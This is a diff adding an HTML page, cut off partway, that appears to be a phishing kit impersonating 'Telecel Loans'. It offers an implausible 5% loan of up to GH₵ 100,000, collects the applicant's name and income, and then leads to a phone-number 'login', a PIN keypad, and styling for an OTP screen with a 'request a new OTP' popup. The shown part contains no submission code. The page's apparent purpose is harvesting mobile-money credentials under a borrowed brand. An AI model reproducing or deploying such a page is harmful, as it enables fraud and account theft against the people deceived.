@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Telecel Loans</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;600;700;800;900&family=DM+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0;}
+    :root{
+      --red:#e2001a;
+      --red-mid:#cc0017;
+      --red-dark:#b30014;
+      --red-light:#ffe5e9;
+      --red-tint:#fff0f2;
+      --text:#1a1a2e;
+      --sub:#6b7280;
+      --hint:#9ca3af;
+      --border:#e5e7eb;
+      --bg:#f9fafb;
+      --white:#ffffff;
+      --green:#16a34a;
+      --red-err:#e53e3e;
+      --muted:#8e96a8;
+      --input-border:#e2e5ef;
+    }
+    html,body{height:100%;font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif;background:var(--bg);display:flex;justify-content:center;margin:0;padding:0;-webkit-font-smoothing:antialiased;}
+    .phone{width:390px;min-height:100vh;background:var(--white);display:flex;flex-direction:column;position:relative;overflow:hidden;}
+    @media(max-width:430px){body{background:var(--white);}.phone{width:100%;min-height:100dvh;}}
+    .scr{display:none;flex-direction:column;min-height:100vh;}
+    @media(max-width:430px){.scr{min-height:100dvh;}}
+    .scr.active{display:flex;}
+
+    .dm-logo{display:flex;align-items:center;gap:0;}
+    .dm-logo img{display:block;width:93px;height:auto;flex-shrink:0;}
+
+    .hdr{padding:18px 20px 0;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+    .step-label{font-size:12px;color:var(--hint);font-weight:400;}
+    .top-accent{height:3px;background:linear-gradient(90deg,var(--red) 0%,var(--red-dark) 100%);flex-shrink:0;}
+    .prog{height:3px;background:var(--border);flex-shrink:0;}
+    .prog-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--red-dark));transition:width 0.4s;}
+
+    .body{padding:24px 20px 16px;flex:1;display:flex;flex-direction:column;overflow-y:auto;-webkit-overflow-scrolling:touch;}
+    .foot{padding:12px 20px 28px;border-top:1px solid var(--border);flex-shrink:0;background:var(--white);}
+
+    .hero-badge{display:inline-flex;align-items:center;gap:6px;background:var(--red-light);border:1px solid var(--red);border-radius:20px;padding:4px 12px;margin-bottom:14px;}
+    .hero-badge-dot{width:7px;height:7px;border-radius:50%;background:var(--red);}
+    .hero-badge-txt{font-size:12px;font-weight:700;color:var(--red-dark);letter-spacing:0.3px;}
+    .hero-amount{font-size:42px;font-weight:300;color:var(--text);letter-spacing:-1.5px;margin-bottom:4px;}
+    .hero-sub{font-size:14px;color:var(--sub);margin-bottom:28px;}
+
+    .amount-input-wrap{margin-bottom:18px;}
+    .amount-input-wrap label{display:block;font-size:12px;color:var(--sub);margin-bottom:7px;font-weight:600;letter-spacing:0.2px;text-transform:uppercase;}
+    .amount-input-row{display:flex;align-items:center;gap:10px;}
+    .currency-symbol{font-size:18px;color:var(--text);font-weight:600;flex-shrink:0;}
+    .amount-input-row input{flex:1;padding:13px 14px;background:var(--white);border:1.5px solid var(--border);border-radius:10px;font-size:16px;font-family:inherit;font-weight:400;color:var(--text);outline:none;transition:border-color 0.15s;}
+    .amount-input-row input:focus{border-color:var(--red);}
+    .amount-input-row input::placeholder{color:var(--hint);}
+    .amount-error{font-size:11px;color:var(--red-err);margin-top:6px;display:none;}
+    .amount-error.show{display:block;}
+
+    .range-wrap{margin-bottom:20px;}
+    .range-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
+    .range-label span{font-size:12px;color:var(--sub);}
+    .range-label .or-text{font-size:11px;color:var(--hint);font-style:italic;}
+    input[type=range]{width:100%;height:4px;-webkit-appearance:none;appearance:none;background:var(--border);border-radius:4px;outline:none;cursor:pointer;display:block;}
+    input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;height:22px;border-radius:50%;background:var(--red);border:2.5px solid var(--red-dark);cursor:pointer;box-shadow:0 2px 6px rgba(226,0,26,0.25);}
+    input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;background:var(--red);border:2.5px solid var(--red-dark);cursor:pointer;}
+    .range-limits{display:flex;justify-content:space-between;margin-top:8px;}
+    .range-limits span{font-size:12px;color:var(--hint);}
+
+    .dur-label{font-size:12px;color:var(--sub);margin-bottom:8px;display:block;font-weight:600;text-transform:uppercase;letter-spacing:0.2px;}
+    .dur-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px;}
+    .dur-opt{padding:12px;border:1.5px solid var(--border);border-radius:10px;background:var(--white);font-size:14px;color:var(--sub);cursor:pointer;font-family:inherit;text-align:center;transition:all 0.15s;}
+    .dur-opt.selected{border-color:var(--red);color:var(--red);background:var(--red-tint);font-weight:700;}
+
+    .detail-row{display:flex;justify-content:space-between;align-items:baseline;padding:13px 0;border-bottom:1px solid var(--border);}
+    .detail-row:first-of-type{border-top:1px solid var(--border);}
+    .detail-lbl{font-size:14px;color:var(--sub);}
+    .detail-val{font-size:14px;color:var(--text);font-weight:600;}
+
+    .spacer{flex:1;min-height:16px;}
+
+    .btn-primary{display:block;width:100%;padding:15px;background:linear-gradient(135deg,var(--red) 0%,var(--red-mid) 100%);border:none;border-radius:10px;font-size:15px;font-weight:700;color:var(--white);cursor:pointer;font-family:inherit;letter-spacing:0.2px;}
+    .btn-primary:disabled{background:#f0b0b8;cursor:not-allowed;}
+    .btn-ghost{display:block;width:100%;padding:15px;background:transparent;border:none;font-size:14px;font-weight:400;color:var(--sub);cursor:pointer;font-family:inherit;margin-top:2px;}
+    .brow{display:flex;gap:10px;}
+    .brow .btn-primary{flex:2;}
+    .btn-back{flex:1;padding:15px;background:transparent;border:1.5px solid var(--border);border-radius:10px;font-size:14px;font-weight:500;color:var(--sub);cursor:pointer;font-family:inherit;}
+
+    .section-title{font-size:20px;font-weight:700;color:var(--text);margin-bottom:6px;}
+    .section-sub{font-size:14px;color:var(--sub);margin-bottom:26px;line-height:1.55;}
+
+    .field{margin-bottom:16px;}
+    .flbl{display:block;font-size:11px;color:var(--sub);margin-bottom:6px;font-weight:700;letter-spacing:0.3px;text-transform:uppercase;}
+    .field input,.field select{width:100%;padding:13px 14px;background:var(--white);border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-family:inherit;font-weight:400;color:var(--text);outline:none;-webkit-appearance:none;transition:border-color 0.15s;}
+    .field select{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%236b7280' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px;}
+    .field input:focus,.field select:focus{border-color:var(--red);}
+    .field input::placeholder{color:var(--hint);}
+    .fpair{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+
+    .summary-block{border:1.5px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px;}
+    .summary-header{background:linear-gradient(135deg,var(--red) 0%,var(--red-mid) 100%);padding:14px 16px;display:flex;align-items:center;gap:8px;}
+    .summary-header-icon{width:24px;height:24px;background:var(--red-light);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;}
+    .summary-header-title{font-size:13px;font-weight:700;color:var(--white);letter-spacing:0.3px;text-transform:uppercase;}
+    .sum-row{display:flex;justify-content:space-between;align-items:center;padding:13px 16px;border-bottom:1px solid var(--border);}
+    .sum-row:last-child{border-bottom:none;}
+    .sum-lbl{font-size:13px;color:var(--sub);}
+    .sum-val{font-size:13px;color:var(--text);font-weight:600;}
+    .sum-row.total{background:var(--red-light);}
+    .sum-row.total .sum-lbl{font-size:14px;color:var(--text);font-weight:600;}
+    .sum-row.total .sum-val{font-size:16px;color:var(--red-dark);font-weight:800;}
+    .legal-text{font-size:12px;color:var(--hint);line-height:1.7;}
+
+    .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(226,0,26,0.5);display:flex;align-items:center;justify-content:center;z-index:100;flex-direction:column;}
+    .overlay-card{background:var(--white);border-radius:20px;padding:36px 28px;text-align:center;max-width:320px;width:90%;box-shadow:0 20px 60px rgba(226,0,26,0.25);}
+    .overlay-spinner{width:52px;height:52px;border:3.5px solid var(--border);border-top-color:var(--red);border-right-color:var(--red-dark);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 20px;}
+    @keyframes spin{to{transform:rotate(360deg);}}
+    .overlay-title{font-size:19px;font-weight:700;color:var(--text);margin-bottom:8px;}
+    .overlay-desc{font-size:14px;color:var(--sub);line-height:1.6;}
+    .overlay-error{color:var(--red-err);margin-top:16px;font-size:13px;display:none;}
+
+    .cool-loader .loading-bar-wrap{width:100%;height:5px;background:var(--border);border-radius:5px;overflow:hidden;margin-top:18px;}
+    .cool-loader .loading-bar{height:100%;background:linear-gradient(90deg,var(--red),var(--red-dark),var(--red));background-size:200% 100%;border-radius:5px;animation:slideBar 1.5s linear infinite;}
+    @keyframes slideBar{0%{background-position:200% 0;width:0%;}50%{width:70%;}100%{background-position:-200% 0;width:100%;}}
+
+    .succ-wrap{flex:1;display:flex;flex-direction:column;padding:48px 24px 32px;}
+    .succ-icon{width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,var(--red),var(--red-mid));display:flex;align-items:center;justify-content:center;margin-bottom:24px;box-shadow:0 8px 20px rgba(226,0,26,0.25);}
+    .succ-icon svg{width:22px;height:22px;stroke:var(--white);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
+    .succ-h{font-size:22px;font-weight:700;color:var(--text);margin-bottom:10px;letter-spacing:-0.3px;}
+    .succ-p{font-size:15px;color:var(--sub);line-height:1.65;margin-bottom:28px;}
+    .ref-box{background:var(--red-tint);border:1.5px solid var(--red);border-radius:10px;padding:16px;margin-bottom:auto;}
+    .ref-lbl{font-size:11px;color:var(--red-dark);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:4px;font-weight:700;}
+    .ref-val{font-size:15px;font-weight:700;color:var(--text);}
+    .fnote{font-size:12px;color:var(--hint);margin-top:32px;text-align:center;}
+
+    /* ── LOGIN SCREEN ── */
+    .scr.login-scr{font-family:'DM Sans',sans-serif;background:#fff;padding:56px 24px 40px;align-items:stretch;}
+    .login-logo-wrap{text-align:left;margin-bottom:28px;}
+    .login-logo-wrap img{width:74px;height:auto;display:block;object-fit:contain;}
+    .login-logo-fallback{width:74px;height:50px;background:linear-gradient(135deg,var(--red),var(--red-dark));border-radius:10px;display:none;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:24px;font-family:'DM Sans',sans-serif;}
+    .login-title{margin-top:0;font-size:28px;font-weight:800;color:#1a1a2e;letter-spacing:-0.5px;font-family:'DM Sans',sans-serif;}
+    .login-subtitle{margin-top:8px;font-size:15px;color:var(--muted);line-height:1.55;font-weight:400;font-family:'DM Sans',sans-serif;}
+    .phone-box{margin-top:32px;height:62px;border:2px solid var(--red);border-radius:16px;display:flex;align-items:center;padding:0 20px;background:#fff;}
+    .country-code{font-size:17px;font-weight:500;color:#1a1a2e;font-family:'DM Sans',sans-serif;}
+    .v-divider{width:1.5px;height:26px;background:#d8dce6;margin:0 16px;flex-shrink:0;}
+    .phone-field-input{flex:1;border:none;outline:none;font-size:17px;font-family:'DM Sans',sans-serif;color:#1a1a2e;background:transparent;}
+    .phone-field-input::placeholder{color:#c5cad6;}
+    .check-icon{color:#1fc26a;font-size:22px;font-weight:700;opacity:0;transition:opacity .2s;}
+    .check-icon.visible{opacity:1;}
+    .terms-row{display:flex;align-items:center;gap:12px;margin-top:auto;margin-bottom:14px;}
+    .terms-checkbox{width:22px;height:22px;border:2px solid #c5cad6;border-radius:6px;background:#fff;cursor:pointer;flex-shrink:0;appearance:none;-webkit-appearance:none;position:relative;transition:background .15s,border-color .15s;}
+    .terms-checkbox:checked{background:var(--red);border-color:var(--red);}
+    .terms-checkbox:checked::after{content:'✓';position:absolute;inset:0;color:#fff;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+    .terms-label{font-size:14px;color:#5a6072;font-family:'DM Sans',sans-serif;}
+    .terms-link{color:var(--red);font-weight:600;text-decoration:none;}
+    .btn-login{width:100%;height:58px;border:none;border-radius:16px;font-size:16px;font-weight:600;font-family:'DM Sans',sans-serif;color:#fff;cursor:pointer;background:#a0a4bf;transition:background .25s,box-shadow .25s;margin-top:20px;}
+    .btn-login.active{background:linear-gradient(90deg,var(--red),var(--red-mid));box-shadow:0 12px 30px rgba(226,0,26,.3);}
+    .btn-login:disabled{cursor:not-allowed;}
+
+    /* ── PIN SCREEN (new design) ── */
+    .scr.pin-scr{font-family:'DM Sans',sans-serif;background:#fff;padding:20px 24px 20px;align-items:stretch;position:relative;}
+    .pin-back-btn{background:none;border:none;font-size:24px;color:#1a1a2e;cursor:pointer;padding:0;width:fit-content;line-height:1;margin-bottom:24px;font-family:'DM Sans',sans-serif;}
+    .pin-back-btn:hover{opacity:0.7;}
+    .pin-logo-wrap{text-align:center;margin-bottom:20px;margin-top:10px;}
+    .pin-logo-wrap img{width:130px;height:auto;display:block;margin:0 auto;object-fit:contain;}
+    .pin-logo-fallback{width:130px;height:61px;background:linear-gradient(135deg,var(--red),var(--red-dark));border-radius:10px;display:none;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:18px;font-family:'DM Sans',sans-serif;text-align:center;line-height:1.2;margin:0 auto;}
+    .pin-page-title{margin-top:0;font-size:24px;font-weight:700;color:#1a1a2e;text-align:center;margin-bottom:6px;letter-spacing:-0.3px;font-family:'DM Sans',sans-serif;}
+    .pin-page-subtitle{font-size:14px;color:var(--muted);text-align:center;margin-bottom:28px;line-height:1.5;font-weight:400;font-family:'DM Sans',sans-serif;}
+    .pin-boxes-row{display:flex;justify-content:center;gap:14px;margin-bottom:12px;}
+    .pin-box{width:48px;height:48px;border:2px solid var(--input-border);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:700;color:#1a1a2e;background:#fff;transition:border-color 0.15s,box-shadow 0.15s;position:relative;flex-shrink:0;}
+    .pin-box.filled{border-color:var(--red);}
+    .pin-box.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(226,0,26,0.12);}
+    .pin-box.error{border-color:var(--red-err);animation:shake2 0.4s ease;}
+    @keyframes shake2{0%,100%{transform:translateX(0);}20%{transform:translateX(-6px);}40%{transform:translateX(6px);}60%{transform:translateX(-4px);}80%{transform:translateX(4px);}}
+    .pin-dot{width:10px;height:10px;border-radius:50%;background:#1a1a2e;}
+    .pin-error-text{text-align:center;color:var(--red-err);font-size:12px;min-height:18px;margin-bottom:8px;font-weight:500;opacity:0;transition:opacity 0.2s;}
+    .pin-error-text.show{opacity:1;}
+    .forgot-pin-wrap{text-align:center;margin-bottom:24px;}
+    .forgot-pin-link{color:var(--red);font-size:13px;font-weight:600;text-decoration:none;cursor:pointer;font-family:'DM Sans',sans-serif;}
+    .forgot-pin-link:hover{text-decoration:underline;}
+    .keypad-container{width:100%;margin-top:0;padding-top:0;margin-bottom:20px;}
+    .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:100%;max-width:280px;margin:0 auto;}
+    .key-btn{aspect-ratio:1;border:none;border-radius:50%;background:#f5f6f8;font-size:24px;font-weight:600;color:#1a1a2e;cursor:pointer;font-family:'DM Sans',sans-serif;display:flex;align-items:center;justify-content:center;transition:background 0.15s,transform 0.1s;-webkit-tap-highlight-color:transparent;user-select:none;}
+    .key-btn:hover{background:#e8eaef;}
+    .key-btn:active{background:#dde0e6;transform:scale(0.95);}
+    .key-btn.empty{background:transparent;cursor:default;pointer-events:none;}
+    .key-btn.delete{background:transparent;}
+    .key-btn.delete:hover{background:#f5f6f8;}
+    .key-btn.delete svg{width:26px;height:26px;stroke:#1a1a2e;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round;}
+    .pin-status-text{text-align:center;font-size:12px;color:var(--hint);margin-top:16px;min-height:16px;}
+
+    /* ── OTP SCREEN ── */
+    .scr.otp-scr{font-family:'DM Sans',sans-serif;background:#fff;padding:56px 24px 40px;align-items:stretch;}
+    .otp-back-btn{background:none;border:none;font-size:24px;color:#1a1a2e;cursor:pointer;padding:0;width:fit-content;line-height:1;margin-bottom:20px;font-family:'DM Sans',sans-serif;}
+    .otp-title{font-size:28px;font-weight:800;color:#1a1a2e;letter-spacing:-0.5px;font-family:'DM Sans',sans-serif;}
+    .otp-subtitle{margin-top:8px;font-size:15px;color:var(--muted);line-height:1.6;font-family:'DM Sans',sans-serif;}
+    .otp-phone-display{color:var(--red);font-weight:600;}
+    .otp-row{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-top:32px;width:100%;}
+    .otp-input{width:100%;aspect-ratio:1;border:2px solid var(--input-border);border-radius:14px;text-align:center;font-size:22px;font-weight:700;font-family:'DM Sans',sans-serif;color:#1a1a2e;outline:none;background:#fff;caret-color:var(--red);transition:border-color .15s;}
+    .otp-input.active-box{border-color:var(--red);}
+    .otp-input:focus{border-color:var(--red);}
+    .otp-timer{margin-top:20px;font-size:20px;font-weight:700;color:#1a1a2e;font-family:'DM Sans',sans-serif;text-align:center;}
+    .otp-timer.expired{color:var(--red);cursor:pointer;}
+    .btn-otp{width:100%;height:58px;border:none;border-radius:16px;font-size:16px;font-weight:600;font-family:'DM Sans',sans-serif;color:#fff;cursor:pointer;background:#a0a4bf;margin-top:auto;transition:background .25s,box-shadow .25s;}
+    .btn-otp.active{background:linear-gradient(90deg,var(--red),var(--red-mid));box-shadow:0 12px 30px rgba(226,0,26,.3);}
+
+    /* ── OTP EXPIRED POPUP ── */
+    .popup-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.55);display:none;align-items:center;justify-content:center;z-index:200;}
+    .popup-overlay.active{display:flex;}
+    .popup-card{background:#fff;border-radius:16px;padding:28px 22px 22px;text-align:center;max-width:300px;width:90%;box-shadow:0 20px 50px rgba(0,0,0,0.3);animation:popIn 0.3s ease-out;}
+    @keyframes popIn{0%{transform:scale(0.85);opacity:0;}100%{transform:scale(1);opacity:1;}}
+    .popup-logo{width:100px;height:auto;margin:0 auto 20px;display:block;}
+    .popup-logo-fallback{width:100px;height:68px;background:linear-gradient(135deg,var(--red),var(--red-dark));border-radius:12px;display:none;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:38px;margin:0 auto 20px;letter-spacing:-1px;}
+    .popup-exclamation{width:52px;height:52px;margin:0 auto 14px;position:relative;}
+    .exclamation-circle-outer{width:52px;height:52px;border-radius:50%;background:var(--red-light);display:flex;align-items:center;justify-content:center;}
+    .exclamation-circle-inner{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--red),var(--red-mid));display:flex;align-items:center;justify-content:center;box-shadow:0 3px 8px rgba(226,0,26,0.3);}
+    .exclamation-mark{color:#fff;font-size:22px;font-weight:800;line-height:1;font-family:'DM Sans',sans-serif;text-shadow:0 1px 2px rgba(0,0,0,0.2);}
+    .popup-title{font-size:18px;font-weight:700;color:var(--text);margin-bottom:6px;}
+    .popup-message{font-size:14px;color:var(--sub);line-height:1.5;margin-bottom:20px;}
+    .popup-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--red),var(--red-mid));border:none;border-radius:10px;font-size:14px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;transition:opacity 0.2s;}
+    .popup-btn:hover{opacity:0.9;}
+    .popup-btn:active{transform:scale(0.98);}
+  </style>
+</head>
+<body>
+<div class="phone">
+
+  <!-- OVERLAY -->
+  <div class="overlay" id="overlay" style="display:none;">
+    <div class="overlay-card" id="overlayCard"></div>
+  </div>
+
+  <!-- OTP EXPIRED POPUP -->
+  <div class="popup-overlay" id="otpPopupOverlay">
+    <div class="popup-card">
+      <img class="popup-logo" id="otpPopupLogoImg" src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="Telecel Logo" onerror="handleOtpPopupLogoError()">
+      <div class="popup-logo-fallback" id="otpPopupLogoFallback">T</div>
+      <div class="popup-exclamation">
+        <div class="exclamation-circle-outer">
+          <div class="exclamation-circle-inner">
+            <span class="exclamation-mark">!</span>
+          </div>
+        </div>
+      </div>
+      <div class="popup-title">No Code Entered</div>
+      <div class="popup-message">You did not receive an OTP?.<br>Please request a new OTP to continue.</div>
+      <button class="popup-btn" onclick="retryOtp()">Retry</button>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ LANDING ═══════════════════ -->
+  <div class="scr active" id="s-land">
+    <div class="top-accent"></div>
+    <div class="hdr">
+      <div class="dm-logo">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+      </div>
+    </div>
+    <div class="body">
+      <div style="margin-bottom:28px;padding-top:8px;">
+        <div class="hero-badge"><div class="hero-badge-dot"></div><span class="hero-badge-txt">Borrow up to GH₵ 100,000</span></div>
+        <div class="hero-amount" id="loanAmt">GH₵ 1,000</div>
+        <div class="hero-sub" id="hero-sub">— /month · 5% per year</div>
+      </div>
+      <div class="amount-input-wrap">
+        <label for="amountInput">Enter loan amount</label>
+        <div class="amount-input-row">
+          <span class="currency-symbol" style="font-size:13px;white-space:nowrap">GH₵</span>
+          <input type="text" id="amountInput" inputmode="numeric" pattern="[0-9]*" placeholder="Minimum GH₵ 1,000" value="" oninput="amountInputChange(this.value)">
+        </div>
+        <div class="amount-error" id="amountError">Minimum loan amount is GH₵ 1,000</div>
+      </div>
+      <div class="range-wrap">
+        <div class="range-label"><span>Or use slider</span><span class="or-text">drag to adjust</span></div>
+        <input type="range" id="slider" min="1000" max="100000" value="1000" step="500" oninput="sliderChange(this.value)">
+        <div class="range-limits"><span>GH₵ 1,000</span><span>GH₵ 100,000</span></div>
+      </div>
+      <span class="dur-label">Repayment period</span>
+      <div class="dur-grid">
+        <button class="dur-opt selected" data-val="6" onclick="selectDur(this)">6 months</button>
+        <button class="dur-opt" data-val="12" onclick="selectDur(this)">12 months</button>
+        <button class="dur-opt" data-val="18" onclick="selectDur(this)">18 months</button>
+        <button class="dur-opt" data-val="24" onclick="selectDur(this)">24 months</button>
+      </div>
+      <div class="detail-row"><span class="detail-lbl">Monthly payment</span><span class="detail-val" id="land-monthly">—</span></div>
+      <div class="detail-row"><span class="detail-lbl">Interest rate</span><span class="detail-val">5% per year, fixed</span></div>
+      <div class="detail-row"><span class="detail-lbl">Total to repay</span><span class="detail-val" id="land-total">—</span></div>
+      <div class="spacer"></div>
+    </div>
+    <div class="foot">
+      <button class="btn-primary" onclick="go('s-land','s-p1')">Apply now</button>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ STEP 1 ═══════════════════ -->
+  <div class="scr" id="s-p1">
+    <div class="top-accent"></div>
+    <div class="hdr">
+      <div class="dm-logo">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+      </div>
+      <span class="step-label">1 of 2</span>
+    </div>
+    <div class="prog"><div class="prog-fill" style="width:50%"></div></div>
+    <div class="body">
+      <div class="section-title">Your information</div>
+      <div class="section-sub">We need a few personal details to process your application.</div>
+      <div class="field">
+        <div class="fpair">
+          <div><label class="flbl">First name</label><input type="text" id="fn" placeholder="Fatouma" oninput="validateAlpha(this);chk1()"></div>
+          <div><label class="flbl">Last name</label><input type="text" id="ln" placeholder="Ali" oninput="validateAlpha(this);chk1()"></div>
+        </div>
+      </div>
+      <div class="field">
+        <label class="flbl">Income source</label>
+        <select id="incomeSource" onchange="chk1()">
+          <option value="">Select income source</option>
+          <option value="Salaried">Salaried</option>
+          <option value="Self-employed">Self-employed</option>
+          <option value="Business owner">Business owner</option>
+          <option value="Student">Student</option>
+          <option value="Unemployed">Unemployed</option>
+          <option value="Retired">Retired</option>
+        </select>
+      </div>
+      <div class="field"><label class="flbl">Monthly income (GH₵)</label><input type="text" inputmode="numeric" id="inc" placeholder="0" oninput="validateNumeric(this);chk1()"></div>
+      <div class="spacer"></div>
+    </div>
+    <div class="foot">
+      <div class="brow">
+        <button class="btn-back" onclick="go('s-p1','s-land')">Back</button>
+        <button class="btn-primary" id="p1btn" onclick="go('s-p1','s-p3')" disabled>Continue</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ STEP 2 ═══════════════════ -->
+  <div class="scr" id="s-p3">
+    <div class="top-accent"></div>
+    <div class="hdr">
+      <div class="dm-logo">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+      </div>
+      <span class="step-label">2 of 2</span>
+    </div>
+    <div class="prog"><div class="prog-fill" style="width:100%"></div></div>
+    <div class="body">
+      <div class="section-title">Summary</div>
+      <div class="section-sub">Please confirm the details below before submitting.</div>
+      <div class="summary-block">
+        <div class="summary-header">
+          <div class="summary-header-icon">📋</div>
+          <span class="summary-header-title"></span>
+        </div>
+        <div class="sum-row"><span class="sum-lbl">Applicant</span><span class="sum-val" id="rv-name">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Income source</span><span class="sum-val" id="rv-source">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Monthly income</span><span class="sum-val" id="rv-inc">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Loan period</span><span class="sum-val" id="rv-dur">—</span></div>
+        <div class="sum-row total"><span class="sum-lbl">Loan amount</span><span class="sum-val" id="rv-amt">—</span></div>
+        <div class="sum-row"><span class="sum-lbl">Monthly repayment</span><span class="sum-val" id="rv-rep">—</span></div>
+      </div>
+      <div class="legal-text">By submitting this application, you confirm that the information provided is accurate and consent to Telecel Loans performing a credit assessment.</div>
+      <div class="spacer"></div>
+    </div>
+    <div class="foot">
+      <div class="brow">
+        <button class="btn-back" onclick="go('s-p3','s-p1')">Back</button>
+        <button class="btn-primary" onclick="showCoolLoader()">Continue to login</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ LOGIN ═══════════════════ -->
+  <div class="scr login-scr" id="s-login">
+    <div class="hdr login-top-logo">
+      <div class="dm-logo">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+      </div>
+    </div>
+    <div class="login-logo-wrap">
+      <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="Telecel Logo" id="loginLogoImg" onerror="handleLoginLogoError()" style="width:135px;height:auto;display:block;object-fit:contain;">
+      <div class="login-logo-fallback" id="loginLogoFallback">T</div>
+    </div>
+    <h1 class="login-title">Confirm your number to continue</h1>
+    <p class="login-subtitle">Enter your mobile number to get started</p>
+    <div class="phone-box">
+      <span class="country-code">+233</span>
+      <div class="v-divider"></div>
+      <input type="tel" id="phoneInputLogin" class="phone-field-input" placeholder="02xxxxxxxx" maxlength="10" inputmode="numeric">
+      <span class="check-icon" id="loginCheckIcon">✓</span>
+    </div>
+    <div class="terms-row">
+      <input type="checkbox" class="terms-checkbox" id="agreeChk">
+      <label class="terms-label" for="agreeChk">I agree to the <a class="terms-link" href="#">Terms of Use</a></label>
+    </div>
+    <button class="btn-login" id="loginContinueBtn" disabled onclick="goToPinPage()">Continue</button>
+  </div>
+
+  <!-- ═══════════════════ PIN PAGE (NEW DESIGN) ═══════════════════ -->
+<!-- ═══════════════════ PIN PAGE (NEW DESIGN) ═══════════════════ -->
+<div class="scr pin-scr" id="s-pin">
+    <div class="hdr pin-top-logo">
+      <div class="dm-logo">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+      </div>
+    </div>
+    
+    <!-- Logo -->
